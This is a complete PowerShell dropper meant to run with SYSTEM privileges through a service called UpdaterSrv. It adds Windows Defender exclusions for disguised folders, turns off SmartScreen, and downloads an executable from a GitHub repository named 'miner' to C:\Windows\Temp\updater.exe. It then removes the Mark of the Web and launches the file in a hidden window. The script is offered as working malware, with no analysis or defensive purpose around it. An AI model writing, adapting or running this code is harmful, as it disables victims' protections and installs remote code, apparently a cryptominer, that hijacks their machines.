# ----------------------------------------
# script.ps1 (Optimized for LocalSystem Service Execution)
# This script will be executed with SYSTEM privileges by your UpdaterSrv.
# It adds Windows Defender exclusions, disables SmartScreen, and fetches/executes an .exe payload.
# ----------------------------------------
Start-Sleep -Seconds 15

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$logDirectory = Split-Path $logPath -Parent

# Ensure the log directory exists
if (-not (Test-Path $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
}

# --- Ensure ServicesPipeTimeout is set for reliable service startup ---
$servicesPipeTimeoutPath = "HKLM:\SYSTEM\CurrentControlSet\Control"
$servicesPipeTimeoutName = "ServicesPipeTimeout"
$desiredTimeoutMs = 120000 # 120 seconds

Add-Content -Path $logPath -Value "Checking and setting ServicesPipeTimeout in registry..."

try {
    $currentTimeout = Get-ItemProperty -Path $servicesPipeTimeoutPath -Name $servicesPipeTimeoutName -ErrorAction SilentlyContinue
    if (-not $currentTimeout -or $currentTimeout.$servicesPipeTimeoutName -lt $desiredTimeoutMs) {
        Set-ItemProperty -Path $servicesPipeTimeoutPath -Name $servicesPipeTimeoutName -Value $desiredTimeoutMs -Force -ErrorAction Stop
        Add-Content -Path $logPath -Value "ServicesPipeTimeout set to ${desiredTimeoutMs}ms. A reboot is required for this change to fully take effect."
    } else {
        Add-Content -Path $logPath -Value "ServicesPipeTimeout is already set to $($currentTimeout.$servicesPipeTimeoutName)ms (or higher than desired ${desiredTimeoutMs}ms)."
    }
} catch {
    Add-Content -Path $logPath -Value "Error setting ServicesPipeTimeout: $_"
}

Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account."

# --- Verify Admin Status ---
function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
if (Is-Admin) {
    Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
} else {
    Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges."
}

# --- Adaptive Wait for Windows Defender ---
Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready..."
$maxAttempts = 20
$delayBetweenChecks = 5

for ($i = 0; $i -lt $maxAttempts; $i++) {
    try {
        $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
        if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
            Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
            break
        }
    } catch {
        Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
    }
    Start-Sleep -Seconds $delayBetweenChecks
    if ($i -eq ($maxAttempts - 1)) {
        Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions."
    }
}
Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."

# --- Add Windows Defender Exclusions ---
Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."

$exclusions = @(
    "C:\Users\Public\SystemLib",
    "C:\Windows\Temp\updater.exe",
    "C:\ProgramData\WinKit"
)

foreach ($excl in $exclusions) {
    try {
        $currentExclusions = Get-MpPreference
        $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
        $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
        $ext = [System.IO.Path]::GetExtension($excl).TrimStart(".")
        $extensionExists = $false
        if ($ext) {
            $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $ext }) -ne $null
        }
        if (-not ($pathExists -or $processExists -or ($ext -and $extensionExists))) {
            Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
            Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
            if ($ext) {
                Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
            }
            Add-Content $logPath "Exclusion added: $excl"
        } else {
            Add-Content $logPath "Exclusion already exists: $excl"
        }
    } catch {
        Add-Content -Path $logPath "Failed to add exclusion: $excl - Error: $_"
    }
}
Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."

# --- Fetch and Execute Payload ---
$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/test.exe" # GitHub direct link
$payloadPath = "C:\Windows\Temp\updater.exe"

Add-Content -Path $logPath -Value "Attempting to disable SmartScreen, fetch, and execute .exe payload from $payloadUrl."

try {
    # Disable SmartScreen
    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
    try {
        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
        Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
    } catch {
        Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
    }

    # Verify SmartScreen status
    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
        Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
    } else {
        Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
    }

    # Ensure payload directory exists
    if (-not (Test-Path (Split-Path $payloadPath -Parent))) {
        New-Item -ItemType Directory -Path (Split-Path $payloadPath -Parent) -Force | Out-Null
        Add-Content -Path $logPath -Value "Created payload directory: $(Split-Path $payloadPath -Parent)."
    }

    # Download the .exe payload
    Add-Content -Path $logPath -Value "Downloading .exe payload from $payloadUrl using Invoke-WebRequest..."
    $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
    Add-Content -Path $logPath -Value "EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"

    # Log downloaded file size
    $downloadedSize = (Get-Item $payloadPath).Length
    Add-Content -Path $logPath -Value "Downloaded file size: $downloadedSize bytes."

    # Check file existence and extension
    if (-not (Test-Path $payloadPath)) {
        throw "Downloaded file not found at $payloadPath."
    }
    if ([System.IO.Path]::GetExtension($payloadPath).ToLower() -ne ".exe") {
        Add-Content -Path $logPath -Value "Warning: Downloaded file does not have .exe extension."
    }
    Add-Content -Path $logPath -Value "File exists at $payloadPath with .exe extension."

    # Remove Mark of the Web
    try {
        Unblock-File -Path $payloadPath -ErrorAction Stop
        Add-Content -Path $logPath -Value "Removed Mark of the Web from $payloadPath."
    } catch {
        Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $payloadPath. Error: $_"
    }

    # Execute the .exe with up to 3 attempts
    $maxAttempts = 3
    $retryDelay = 5 # Seconds between attempts
    $success = $false

    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
        try {
            Add-Content -Path $logPath -Value "Attempting to execute payload (Attempt $attempt of $maxAttempts)..."
            Start-Process -FilePath $payloadPath -WindowStyle Hidden -ErrorAction Stop
            Add-Content -Path $logPath -Value "Payload executed successfully on attempt $attempt."
            $success = $true
            break
        } catch {
            Add-Content -Path $logPath -Value "Execution failed on attempt $attempt: $_"
            if ($attempt -lt $maxAttempts) {
                Add-Content -Path $logPath -Value "Waiting $retryDelay seconds before retrying..."
                Start-Sleep -Seconds $retryDelay
            }
        }
    }

    if (-not $success) {
        throw "Failed to execute payload after $maxAttempts attempts."
    }

} catch {
    Add-Content -Path $logPath -Value "Failed to fetch or execute payload from $payloadUrl. Error: $_"
}

Add-Content -Path $logPath -Value "Script execution finished at $(Get-Date)."
